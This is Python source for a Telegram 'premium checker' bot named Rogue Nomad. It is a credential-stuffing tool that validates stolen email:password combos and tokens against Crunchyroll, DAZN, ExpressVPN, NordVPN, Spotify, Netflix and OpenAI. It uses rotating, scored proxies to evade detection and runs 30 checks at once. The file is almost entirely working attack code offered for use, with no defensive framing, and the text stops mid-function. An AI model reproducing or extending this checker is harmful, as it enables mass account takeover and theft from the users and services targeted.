#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROGUE NOMAD - Premium Checker Bot
Created for Butter | https://t.me/+ckfO94UHyhllODg0
Admin: 1875307475
"""

import os
import asyncio
import logging
import json
import re
import io
import random
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from contextlib import asynccontextmanager

# ============================================
# TELEGRAM IMPORTS
# ============================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode

# ============================================
# EXTERNAL LIBRARIES
# ============================================
import aiohttp
import aiosqlite

# ============================================
# CONFIGURATION - LOAD FROM ENVIRONMENT
# ============================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.getenv("ADMIN_ID", "1875307475"))
DATABASE_URL = os.getenv("DATABASE_URL", "rogue_nomad.db")
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
BOT_NAME = "Rogue Nomad"
BOT_VERSION = "v3.0"

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=getattr(logging, LOG_LEVEL)
)
logger = logging.getLogger(__name__)

# ============================================
# DATABASE LAYER - PERSISTENT STORAGE
# ============================================
INIT_DB = """
-- Proxies table
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy TEXT UNIQUE NOT NULL,
    score INTEGER DEFAULT 100,
    failures INTEGER DEFAULT 0,
    alive BOOLEAN DEFAULT 1,
    last_used TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Check results table
CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    chat_id INTEGER NOT NULL,
    service TEXT NOT NULL,
    credential TEXT NOT NULL,
    valid BOOLEAN DEFAULT 0,
    status TEXT,
    data TEXT,
    proxy_used TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- User statistics
CREATE TABLE IF NOT EXISTS user_stats (
    user_id INTEGER PRIMARY KEY,
    total_checks INTEGER DEFAULT 0,
    total_valid INTEGER DEFAULT 0,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Global statistics
CREATE TABLE IF NOT EXISTS global_stats (
    id INTEGER PRIMARY KEY,
    service TEXT NOT NULL,
    total INTEGER DEFAULT 0,
    valid INTEGER DEFAULT 0,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Indexes for performance
CREATE INDEX IF NOT EXISTS idx_checks_user ON checks(user_id);
CREATE INDEX IF NOT EXISTS idx_checks_service ON checks(service);
CREATE INDEX IF NOT EXISTS idx_checks_created ON checks(created_at);
CREATE INDEX IF NOT EXISTS idx_proxy_alive ON proxies(alive);
CREATE INDEX IF NOT EXISTS idx_proxy_score ON proxies(score);
"""

@asynccontextmanager
async def get_db():
    """Database connection context manager - handles connection automatically."""
    async with aiosqlite.connect(DATABASE_URL) as db:
        await db.execute(INIT_DB)
        await db.commit()
        yield db

# ============================================
# PROXY MANAGER - HANDLES PROXY ROTATION
# ============================================
class ProxyManager:
    """
    Manages proxy rotation with persistence and scoring.
    Proxies with higher scores are used more often.
    Failed proxies get penalized and eventually disabled.
    """
    
    def __init__(self):
        self._cache = []
        self._cache_time = 0
        self._cache_ttl = 60  # Refresh cache every 60 seconds
    
    async def get_working_proxies(self) -> List[str]:
        """Get list of working proxies from database with caching."""
        # Return cached if fresh
        if time.time() - self._cache_time < self._cache_ttl and self._cache:
            return self._cache
        
        # Fetch from database
        async with get_db() as db:
            cursor = await db.execute(
                "SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500"
            )
            rows = await cursor.fetchall()
            self._cache = [row[0] for row in rows]
            self._cache_time = time.time()
            return self._cache
    
    async def get_proxy(self) -> Optional[str]:
        """Get a random working proxy."""
        proxies = await self.get_working_proxies()
        if not proxies:
            return None
        return random.choice(proxies)
    
    async def add_proxy(self, proxy: str) -> bool:
        """Add a single proxy to the database."""
        # Clean format - remove http:// or https://
        proxy = proxy.replace("http://", "").replace("https://", "").strip()
        
        # Validate format
        if not proxy or ":" not in proxy:
            return False
        
        # Check if it has user:pass format (4 parts)
        parts = proxy.split(":")
        if len(parts) == 4:
            # host:port:user:pass - valid
            pass
        elif len(parts) == 2:
            # host:port - valid
            pass
        else:
            return False
        
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT OR IGNORE INTO proxies (proxy) VALUES (?)",
                    (proxy,)
                )
                await db.commit()
                # Clear cache so new proxy is picked up
                self._cache = []
                return True
        except Exception as e:
            logger.error(f"Error adding proxy {proxy}: {e}")
            return False
    
    async def add_proxies_from_text(self, content: str) -> int:
        """Add multiple proxies from text content (one per line)."""
        added = 0
        for line in content.strip().split("\n"):
            line = line.strip()
            # Skip empty lines and comments
            if line and not line.startswith("#"):
                if await self.add_proxy(line):
                    added += 1
        return added
    
    async def report_result(self, proxy: str, success: bool):
        """
        Update proxy score based on check result.
        Success = +5 points, Failure = -10 points, 3 failures = disabled.
        """
        if not proxy:
            return
        
        async with get_db() as db:
            if success:
                await db.execute(
                    "UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?",
                    (proxy,)
                )
            else:
                await db.execute(
                    "UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?",
                    (proxy,)
                )
                # Disable after 3 failures
                await db.execute(
                    "UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3",
                    (proxy,)
                )
            await db.commit()
            # Clear cache
            self._cache = []
    
    async def get_stats(self) -> Dict:
        """Get proxy statistics."""
        async with get_db() as db:
            total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
            alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
            return {
                "total": total[0][0] if total else 0,
                "alive": alive[0][0] if alive else 0
            }

# ============================================
# SERVICE CHECKERS - EACH SERVICE HAS ITS OWN CHECKER
# ============================================
class ServiceCheckers:
    """
    Contains all service-specific checkers.
    Add your own services here following the same pattern.
    """
    
    @staticmethod
    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        """
        Check Crunchyroll credentials.
        Returns: {'valid': bool, 'status': str, 'tier': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                # Get CSRF token first
                async with session.get(
                    "https://www.crunchyroll.com/",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    html = await resp.text()
                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                    csrf = csrf_match.group(1) if csrf_match else ""
                
                # Attempt login
                async with session.post(
                    "https://www.crunchyroll.com/login",
                    data={"email": email, "password": password, "csrf_token": csrf},
                    proxy=proxy,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 302:
                        return {"valid": True, "status": "active", "tier": "premium"}
                    return {"valid": False, "status": "invalid"}
        except Exception as e:
            logger.error(f"Crunchyroll check error: {e}")
            return {"valid": False, "status": "error", "error": str(e)}
    
    @staticmethod
    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
        """
        Check Netflix token (from TV login).
        Returns: {'valid': bool, 'status': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                async with session.get(
                    "https://www.netflix.com/api/shakti/viper/metadata",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {
                            "valid": True,
                            "status": "active",
                            "profile": data.get("profile", {}).get("name", "Unknown")
                        }
                    return {"valid": False, "status": "expired"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        """
        Check DAZN credentials.
        Returns: {'valid': bool, 'status': str, 'region': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://login.dazn.com/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {
                            "valid": True,
                            "status": "active",
                            "region": data.get("region", "Unknown")
                        }
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
        """
        Check OpenAI API key.
        Returns: {'valid': bool, 'status': str, 'tier': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}"}
                async with session.get(
                    "https://api.openai.com/v1/models",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active", "tier": "paid"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        """
        Check ExpressVPN credentials.
        Returns: {'valid': bool, 'status': str, 'plan': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://www.expressvpn.com/api/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        """
        Check NordVPN credentials.
        Returns: {'valid': bool, 'status': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://api.nordvpn.com/v1/users/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_spotify(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        """
        Check Spotify credentials.
        Returns: {'valid': bool, 'status': str, 'tier': str}
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://accounts.spotify.com/api/v1/login",
                    data={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {
                            "valid": True,
                            "status": "active",
                            "tier": data.get("product", "Unknown")
                        }
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}

# ============================================
# CHECKER ENGINE - ORCHESTRATES ALL CHECKS
# ============================================
class CheckerEngine:
    """
    The heart of Rogue Nomad - manages check operations.
    Handles concurrency, rate limiting, and result aggregation.
    """
    
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        
        # Register all available services
        self.services = {
            "crunchyroll": {
                "checker": ServiceCheckers.check_crunchyroll,
                "type": "email:pass",
                "label": "🍿 Crunchyroll"
            },
            "netflix": {
                "checker": ServiceCheckers.check_netflix_token,
                "type": "token",
                "label": "📺 Netflix"
            },
            "dazn": {
                "checker": ServiceCheckers.check_dazn,
                "type": "email:pass",
                "label": "⚽ DAZN"
            },
            "openai": {
                "checker": ServiceCheckers.check_openai_token,
                "type": "token",
                "label": "🧠 OpenAI"
            },
            "expressvpn": {
                "checker": ServiceCheckers.check_expressvpn,
                "type": "email:pass",
                "label": "🔒 ExpressVPN"
            },
            "nordvpn": {
                "checker": ServiceCheckers.check_nordvpn,
                "type": "email:pass",
                "label": "🔐 NordVPN"
            },
            "spotify": {
                "checker": ServiceCheckers.check_spotify,
                "type": "email:pass",
                "label": "🎵 Spotify"
            }
        }
        
        # Concurrency control
        self.semaphore = asyncio.Semaphore(30)
        
        # Statistics
        self.stats = {
            "total": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 0,
            "by_service": {}
        }
    
    def _parse_credential(self, cred: str) -> Dict:
        """
        Parse credential string into appropriate format.
        Supports: email:pass, token, or raw text.
        """
        cred = cred.strip()
        
        # Check if it's email:password format
        if ":" in cred and "@" in cred:
            parts = cred.split(":", 1)
            return {"email": parts[0].strip(), "password": parts[1].strip()}
        
        # Check if it looks like a token (JWT or long string)
        elif cred.startswith("ey") or len(cred) > 30:
            return {"token": cred}
        
        # Fallback - treat as raw
        else:
            return {"raw": cred}
    
    async def check_single(
        self, 
        service: str, 
        credential: str, 
        use_proxy: bool = True,
        user_id: int = 0,
        chat_id: int = 0
    ) -> Dict:
        """
        Check a single credential against a service.
        Returns detailed result with metadata.
        """
        async with self.semaphore:
            # Get proxy if enabled
            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
            
            # Get the checker function
            service_info = self.services.get(service)
            if not service_info:
                return {"valid": False, "status": "unknown_service", "error": "Service not found"}
            
            checker = service_info["checker"]
            parsed = self._parse_credential(credential)
            
            try:
                # Execute the check
                result = await checker(**parsed, proxy=proxy)
                
                # Update proxy score
                if proxy:
                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
                
                # Update statistics
                self._update_stats(service, result.get("valid", False))
                
                # Log to database
                await self._log_check(
                    user_id=user_id,
                    chat_id=chat_id,
                    service=service,
                    credential=credential[:50],  # Truncate for privacy
                    valid=result.get("valid", False),
                    status=result.get("status", "unknown"),
                    data=json.dumps(result),
                    proxy_used=proxy
               
